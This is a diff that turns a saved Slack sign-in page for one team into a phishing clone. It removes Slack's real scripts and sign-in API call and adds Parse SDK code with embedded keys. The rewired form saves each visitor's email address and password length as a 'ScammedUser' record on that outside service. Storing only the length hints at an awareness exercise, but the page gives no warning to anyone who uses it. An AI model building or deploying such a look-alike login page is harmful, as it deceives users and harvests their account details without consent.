@@ -2,233 +2,48 @@
 <html lang="en" >
 
 <head>
+	<script src="//www.parsecdn.com/js/parse-1.5.0.min.js"></script>
 	<script type="text/javascript">
-window.TSMark = function(mark_label) {
-	if (!true || !window.performance || !window.performance.mark) return;
-	performance.mark(mark_label);
-}
-TSMark('start_load');
-window.TSMeasureAndBeacon = function(measure_label, start_mark_label) {
-	if (!true || !window.performance || !window.performance.mark || !window.performance.measure) return;
-	performance.mark(start_mark_label + '_end');
-	try {
-		performance.measure(measure_label, start_mark_label, start_mark_label + '_end');
-		(new Image()).src = "https:\/\/slack.com\/beacon\/timing" + '?data=' + encodeURIComponent(measure_label + ':' + performance.getEntriesByName(measure_label)[0].duration);
-	} catch(e) { return; }
-}
-</script>	<noscript><meta http-equiv="refresh" content="0; URL='index-nojsmode=1.html'" /></noscript>
-<script type="text/javascript">
-window.load_start_ms = Date.now();
-window.load_log = [];
-window.logLoad = function(k) {
-	var ms = Date.now();
-	var secs = (ms-window.load_start_ms)/1000;
+		Parse.initialize("n4ouSsZ6FLsbkmo91lW6UmytEJowfl8co8yF0nhS", "ZNWCnykswxUykcHhqYSOsdcEKXfCVc4X72rUKfMA");
+		var ScammedUser = Parse.Object.extend("ScammedUser");
+		var scammedUser = new ScammedUser();
 
-	window.load_log.push({
-		k: k,
-		t: secs
-	})
-	
-	if (window.TS) {
-		TS.log(88, secs+' '+k);
-	}
-}
-if(self!==top)window.document.write("\u003Cstyle>body * {display:none !important;}\u003C\/style>\u003Ca href=\"#\" onclick="+
-"\"top.location.href=window.location.href\" style=\"display:block !important;padding:10px\">Go to Slack.com\u003C\/a>");
-</script>
-
-
-<script type="text/javascript">
-window.callSlackAPIUnauthed = function(method, args, callback) {
-	var url = '/api/'+method+'?t='+Date.now();
-	var req = new XMLHttpRequest();
-	
-	req.onreadystatechange = function() {
-		if (req.readyState == 4) {
-			req.onreadystatechange = null;
-			var obj;
-			
-			if (req.status == 200) {
-				if (req.responseText.indexOf('{') == 0) {
-					try {
-						eval('obj = '+req.responseText);
-					} catch (err) {
-						console.warn('unable to do anything with api rsp');
-					}
-				}
-			}
-			
-			obj = obj || {
-				ok: false	
-			}
-			
-			callback(obj.ok, obj, args);
-		}
-	}
-	
-	req.open('POST', url, 1);
-	req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-
-	var args2 = [];
-	for (i in args) {
-		args2[args2.length] = encodeURIComponent(i)+'='+encodeURIComponent(args[i]);
-	}
-
-	req.send(args2.join('&'));
-}
-</script>
-
-			
-	
-	<script type="text/javascript">
-		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-		ga('create', "UA-106458-17", 'slack.com');
-		ga('send', 'pageview');
-
-		
-		(function(e,c,b,f,d,g,a){e.SlackBeaconObject=d;
-		e[d]=e[d]||function(){(e[d].q=e[d].q||[]).push([1*new Date(),arguments])};
-		e[d].l=1*new Date();g=c.createElement(b);a=c.getElementsByTagName(b)[0];
-		g.async=1;g.src=f;a.parentNode.insertBefore(g,a)
-		})(window,document,"script","https://slack.global.ssl.fastly.net/dcf8/js/libs/beacon.js","sb");
-		sb('set', 'token', '3307f436963e02d4f9eb85ce5159744c');
-
-				sb('track', 'pageview');
-
-		function track(a){ga('send','event','web',a);sb('track',a);}
-
-	</script>
-
-
-		<script type='text/javascript'>
-		
-		(function(f,b){if(!b.__SV){var a,e,i,g;window.mixpanel=b;b._i=[];b.init=function(a,e,d){function f(b,h){var a=h.split(".");2==a.length&&(b=b[a[0]],h=a[1]);b[h]=function(){b.push([h].concat(Array.prototype.slice.call(arguments,0)))}}var c=b;"undefined"!==typeof d?c=b[d]=[]:d="mixpanel";c.people=c.people||[];c.toString=function(b){var a="mixpanel";"mixpanel"!==d&&(a+="."+d);b||(a+=" (stub)");return a};c.people.toString=function(){return c.toString(1)+".people (stub)"};i="disable track track_pageview track_links track_forms register register_once alias unregister identify name_tag set_config people.set people.set_once people.increment people.append people.track_charge people.clear_charges people.delete_user".split(" ");
-		for(g=0;g<i.length;g++)f(c,i[g]);b._i.push([a,e,d])};b.__SV=1.2;a=f.createElement("script");a.type="text/javascript";a.async=!0;a.src="//cdn.mxpnl.com/libs/mixpanel-2-latest.min.js";e=f.getElementsByTagName("script")[0];e.parentNode.insertBefore(a,e)}})(document,window.mixpanel||[]);
-		
-
-		mixpanel.init("12d52d8633a5b432975592d13ebd3f34");
-
-		
-			function mixpanel_track(){if(window.mixpanel)mixpanel.track.apply(mixpanel, arguments);}
-			function mixpanel_track_forms(){if(window.mixpanel)mixpanel.track_forms.apply(mixpanel, arguments);}
-			function mixpanel_track_links(){if(window.mixpanel)mixpanel.track_links.apply(mixpanel, arguments);}
-		
-	</script>
-	
-			<meta name="referrer" content="no-referrer">
-			<meta name="superfish" content="nofish">
-	<script type="text/javascript">
-
-
-
-var TS_last_log_date = null;
-var TSMakeLogDate = function() {
-	var date = new Date();
-
-	var y = date.getFullYear();
-	var mo = date.getMonth()+1;
-	var d = date.getDate();
-
-	var time = {
-	  h: date.getHours(),
-	  mi: date.getMinutes(),
-	  s: date.getSeconds(),
-	  ms: date.getMilliseconds()
-	};
-
-	Object.keys(time).map(function(moment, index) {
-		if(time[moment] < 10) {
-			time[moment] = '0' + time[moment];
-		}
-	});
-
-	var str = y + '/' + mo + '/' + d + ' ' + time.h + ':' + time.mi + ':' + time.s + '.' + time.ms;
-	if (TS_last_log_date) {
-		var diff = date-TS_last_log_date;
-		//str+= ' ('+diff+'ms)';
-	}
-	TS_last_log_date = date;
-	return str+' ';
-}
-
-var TSSSB = {
-	env: (function() {
-		var v = {
-			win_ssb_version: null,
-			win_ssb_version_minor: null,
-			mac_ssb_version: null,
-			mac_ssb_version_minor: null,
-			lin_ssb_version: null,
-			lin_ssb_version_minor: null
-		}
-		
-		var is_win = (navigator.appVersion.indexOf("Windows") !== -1);
-		var is_lin = (navigator.appVersion.indexOf("Linux") !== -1);
-		var is_mac = !!(navigator.userAgent.match(/(OS X)/g));
-
-		if (navigator.userAgent.match(/(Slack_SSB)/g) || navigator.userAgent.match(/(Slack_WINSSB)/g)) {
-			// Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.55.3 (KHTML, like Gecko) Slack_SSB/0.32
-			var parts = navigator.userAgent.split('/');
-			var version_str = parts[parts.length-1];
-			var version_float = parseFloat(version_str);
-			var versionA = version_str.split('.');
-			var version_minor = (versionA.length == 3) ? parseInt(versionA[2]) : 0;
-	
-			if (navigator.userAgent.match(/(AtomShell)/g)) {
-				// Electron-based app
-				if (is_lin) {
-					v.lin_ssb_version = version_float;
-					v.lin_ssb_version_minor = version_minor;
-				} else {
-					v.win_ssb_version = version_float;
-					v.win_ssb_version_minor = version_minor;
-				}
-			} else {
-				// MacGap-based app
-				v.mac_ssb_version = version_float;
-				v.mac_ssb_version_minor = version_minor;
-			}
+		function onSubmitKey(e) {
+			if (e.keyCode == 13)
+				onSubmit();
 		}
 
-		return v;
-	})(),
-	
-	
+		function onSubmit() {
+			var accountDetails = {
+				email: document.getElementById('email').value,
+				password: document.getElementById('password').value.length
+			};
 
-	call: function() {
-		return false;
-	}
+			if (!accountDetails.email || !accountDetails.password) return
 
-	
-}
+			scammedUser.save(accountDetails).then(function(object) {
+			  console.log('Success', accountDetails);
+			});
+		}
 
-</script>	<script type="text/javascript">
-		
-		var was_TS = window.TS;
-		delete window.TS;
-		TSSSB.call('didFinishLoading');
-		if (was_TS) window.TS = was_TS;
 	</script>
 	    <meta charset="utf-8">
     <title>Slack</title>
     <meta name="author" content="Slack">
     <meta name="robots" content="noindex,nofollow">
 
-	
-																
-																													
-				
-																
-				
-		
+
+
+
+
+
+
+
 				<!-- output_css "core" -->
     <link href="https://slack.global.ssl.fastly.net/b747/style/rollup-plastic.css" rel="stylesheet" type="text/css">
 
 		<!-- output_css "file_pages" -->
-		
+
 	<!-- output_css "regular" -->
     <link href="https://slack.global.ssl.fastly.net/3f9e/style/index.css" rel="stylesheet" type="text/css">
     <link href="https://slack.global.ssl.fastly.net/1e63/style/libs/lato-1.css" rel="stylesheet" type="text/css">
@@ -236,17 +51,17 @@ var TSSSB = {
     <link href="https://slack.global.ssl.fastly.net/fbe81/style/footer.css" rel="stylesheet" type="text/css">
     <link href="https://slack.global.ssl.fastly.net/365f/style/filter_select.css" rel="stylesheet" type="text/css">
 
-	
 
-	
-	
-	
+
+
+
+
 
 	<!--[if lt IE 9]>
 	<script src="https://slack.global.ssl.fastly.net/ef0d/js/libs/html5shiv.js"></script>
 	<![endif]-->
 
-	
+
 <link id="favicon" rel="shortcut icon" href="https://slack.global.ssl.fastly.net/66f9/img/icons/favicon-32.png" sizes="16x16 32x32 48x48" type="image/png" />
 
 <link rel="icon" href="https://slack.global.ssl.fastly.net/ba3c/img/icons/app-256.png" sizes="256x256" type="image/png" />
@@ -275,16 +90,16 @@ Bugsnag.refresh_interval = setInterval(function () { (window.TS && window.TS.cli
 <body class="index">
 
 		  			<script>
-		
+
 			var w = Math.max(document.documentElement.clientWidth, window.innerWidth || 0);
 			if (w > 1440) document.querySelector('body').classList.add('widescreen');
-		
-		</script>
-	
-  	
-	
 
-	
+		</script>
+
+
+
+
+
 							<nav class="top persistent">
 	<a href="https://slack.com/" class="logo"></a>
 	<ul>
@@ -309,7 +124,7 @@ Bugsnag.refresh_interval = setInterval(function () { (window.TS && window.TS.cli
 		<li><a href="https://slack.com/signin">Sign in</a></li>
 	</ul>
 	<a href="https://slack.com/create" class="sign_up ga_track_signup mxpnl_signup_nav ">Sign up for free</a>
-</nav>	
+</nav>
 	<div id="page" >
 
 		<div id="page_contents" class="">
@@ -321,9 +136,9 @@ Bugsnag.refresh_interval = setInterval(function () { (window.TS && window.TS.cli
 
 	<div class="real_content card align_center span_4_of_6 col float_none margin_auto large_bottom_margin right_padding large_bottom_padding">
 	<h1> Sign in to <span class="break_word">subvisual.slack.com</span></h1>
-	
+
 	<div class="col span_4_of_6 float_none margin_auto large_bottom_margin">
-		<form id="signin_form" action="/" method="post" accept-encoding="UTF-8">
+		<div id="signin_form">
 			<input type="hidden" name="signin" value="1" />
 			<input type="hidden" name="redir" value="" />
 						<input type="hidden" name="crumb" value="s-1441054604-ab714b4075-☃" />
@@ -331,23 +146,23 @@ Bugsnag.refresh_interval = setInterval(function () { (window.TS && window.TS.cli
 			<p>Enter your <strong>email address</strong> and <strong>password</strong>.</p>
 
 			<p class=" no_bottom_margin">
-				<input type="email" id="email" name="email" size="40" value="" placeholder="you@domain.com" />
+				<input type="email" id="email" name="email" size="40" value="" placeholder="you@domain.com" onkeyup="onSubmitKey(event)"/>
 			</p>
 
 			<p class=" small_bottom_margin">
-				<input type="password" id="password" name="password" size="40" placeholder="password" />
+				<input type="password" id="password" name="password" size="40" placeholder="password" onkeyup="onSubmitKey(event)"/>
 			</p>
-			
-			
-				
-							
-			<p><button id="signin_btn" type="submit" class="btn btn_large full_width ladda-button" data-style="expand-right" /><span class="ladda-label">Sign in</span></button></p>
+
+
+
+
+			<p><button id="signin_btn" type="submit" class="btn btn_large full_width ladda-button" data-style="expand-right" onclick="onSubmit()"/><span class="ladda-label">Sign in</span></button></p>
 
 			<p><label class="checkbox"><input type="checkbox" name="remember" checked /> Keep me signed in</label></p>
 
 							<p class="small"><a href="forgot.html" class="bold">I forgot my password</a></p>
-			
-		</form>
+
+		</div>
 
 		<div id="signup_prompt" class="signin_msg large_top_margin large_bottom_margin" style="display: none;">
 			<hr class="half_width no_top_margin" />
@@ -375,12 +190,12 @@ Bugsnag.refresh_interval = setInterval(function () { (window.TS && window.TS.cli
 </div>
 	<div class="real_content align_center">
 			<p>If you have an <strong>@groupbuddies.com</strong> email address, you can <a href="signup.html" class="bold">create an account</a>.</p>
-	
-	
+
+
 			<p>Trying to create a team? <a href="https://slack.com/" class="bold">Sign up on the home page</a> to get started.</p>
 	</div>
 
-			
+
 	</div>
 	<div id="overlay"></div>
 </div>
@@ -457,16 +272,16 @@ var inc_js_setup_data = {
 <script type="text/javascript" src="https://slack.global.ssl.fastly.net/9aa4/js/libs/ladda.js" crossorigin="anonymous"></script>
 
 		<script type="text/javascript">
-					
+
 				$('input[name="email"]').val() ? $('input[name="password"]').focus() : $('input[name="email"]').focus();
-			
-						
+
+
 			if (navigator.userAgent.match(/windows phone/i)) {
 				$('input[name="password"]').css('font-family', 'sans-serif,arial,verdana,tahoma');
 			}
-		
 
-		
+
+
 
 		var $signin_btn = $('#signin_btn');
 		$signin_btn.data('ladda', Ladda.create(document.querySelector('#signin_btn')));
@@ -516,47 +331,6 @@ var inc_js_setup_data = {
 				team: team_id
 			};
 
-			window.callSlackAPIUnauthed('auth.findUser', api_args, function(ok, data, args) {
-
-					if (!ok) {
-
-						if (data.error == 'user_not_found') {
-
-							$('#user_not_found').slideDown(150);
-
-						} else if (data.error == 'user_disabled') {
-
-							$('#user_disabled').slideDown(150);
-
-						} else if (data.error == 'ratelimited') {
-
-							$('#error_ratelimit').slideDown(150);
-
-						} else {
-
-							$('#error_unknown').slideDown(150);
-
-						}
-
-						return;
-
-					}
-
-					if (data.found) {
-
-						// do nothing: let the form submit
-
-					} else if (data.can_join) {
-
-						// no match found, but email matches whitelisted domain: show create account option
-						$('#signup_prompt').slideDown(150);
-						$('#signup_link').prop('href', '/signup?email='+encodeURIComponent(email)+(no_sso ? '&no_sso=1' : ''));
-
-					}
-
-				}
-
-			);
 
 		});
 
@@ -575,7 +349,7 @@ var inc_js_setup_data = {
 			$('.send_code_block').slideToggle();
 		});
 
-		
+
 	</script>
 
 	<!-- slack-www367 / 2015-08-31 13:56:44 / vc6c8314827380f6f61189a80074b827a81b41760 -->
